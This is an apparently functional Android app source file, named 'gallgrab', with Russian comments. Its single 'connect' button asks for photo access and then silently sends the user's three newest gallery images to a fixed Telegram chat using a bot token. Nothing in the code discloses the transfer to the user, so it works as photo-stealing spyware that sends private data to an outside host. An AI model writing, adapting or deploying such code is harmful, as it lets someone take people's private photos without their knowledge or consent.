package xss.nmz.gallgrab_nmz;

import android.Manifest;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.util.Log;
import android.widget.Button;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okio.BufferedSink;
import okio.Okio;
import okio.Source;

public class MainActivity extends AppCompatActivity {

    private ActivityResultLauncher<String> permissionLauncher;
    private final OkHttpClient client = new OkHttpClient();

    @Override protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        permissionLauncher = registerForActivityResult(
                new ActivityResultContracts.RequestPermission(),
                isGranted -> {
                    if (isGranted) uploadLastImages(3);
                    else Log.w("perm", "Доступ к фото не выдан");
                });

        Button btn = findViewById(R.id.btn_connect);
        btn.setOnClickListener(v -> {
            if (hasImagesPermission()) uploadLastImages(3);
            else permissionLauncher.launch(getImagesPermission());
        });
    }

    private boolean hasImagesPermission() {
        return ContextCompat.checkSelfPermission(this, getImagesPermission())
                == PackageManager.PERMISSION_GRANTED;
    }

    private String getImagesPermission() {
        if (Build.VERSION.SDK_INT >= 33) return Manifest.permission.READ_MEDIA_IMAGES;
        else return Manifest.permission.READ_EXTERNAL_STORAGE;
    }

    private void uploadLastImages(int count) {
        String botToken = BuildConfig.TG_BOT_TOKEN; // задается в local.properties
        if (botToken == null || botToken.isEmpty()) {
            Log.e("tg", "Bot token пуст. Укажите botToken в local.properties");
            return;
        }

        List<Uri> uris = queryLastImageUris(count);
        for (Uri uri : uris) {
            sendUriToTelegram(uri, botToken);
        }
    }

    private List<Uri> queryLastImageUris(int count) {
        List<Uri> result = new ArrayList<>();
        String[] proj = new String[] {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.SIZE
        };
        String sort = MediaStore.Images.Media.DATE_ADDED + " DESC";
        try (Cursor c = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, proj, null, null, sort)) {
            if (c != null) {
                int idIdx = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
                int szIdx = c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE);
                while (c.moveToNext() && result.size() < count) {
                    long id = c.getLong(idIdx);
                    long size = c.getLong(szIdx);
                    if (size > 48L * 1024 * 1024) continue; // ~50MB лимит Telegram для sendDocument
                    Uri uri = ContentUris.withAppendedId(
                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
                    result.add(uri);
                }
            }
        }
        return result;
    }

    private void sendUriToTelegram(Uri uri, String botToken) {
        String chatId = "462656683"; // проверьте, что этот пользователь НАПИСАЛ боту раньше
        String url = "https://api.telegram.org/bot" + botToken + "/sendDocument";

        RequestBody fileBody = new ContentUriRequestBody(getContentResolver(), uri, "application/octet-stream");
        RequestBody form = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", chatId)
                .addFormDataPart("document", "image.jpg", fileBody)
                .build();

        Request req = new Request.Builder().url(url).post(form).build();

        client.newCall(req).enqueue(new Callback() {
            @Override public void onFailure(Call call, IOException e) {
                Log.e("tg", "Ошибка отправки", e);
            }
            @Override public void onResponse(Call call, Response response) throws IOException {
                if (!response.isSuccessful()) {
                    Log.e("tg", "Код " + response.code() + " / " + response.message());
                } else {
                    Log.d("tg", "Отправлено успешно");
                }
                response.close();
            }
        });
    }

    static class ContentUriRequestBody extends RequestBody {
        private final ContentResolver resolver;
        private final Uri uri;
        private final MediaType mediaType;

        ContentUriRequestBody(ContentResolver resolver, Uri uri, String mime) {
            this.resolver = resolver;
            this.uri = uri;
            this.mediaType = MediaType.get(mime != null ? mime : "application/octet-stream");
        }

        @Override public MediaType contentType() { return mediaType; }

        @Override public void writeTo(BufferedSink sink) throws IOException {
            try (Source source = Okio.source(resolver.openInputStream(uri))) {
                sink.writeAll(source);
            }
        }
    }
}

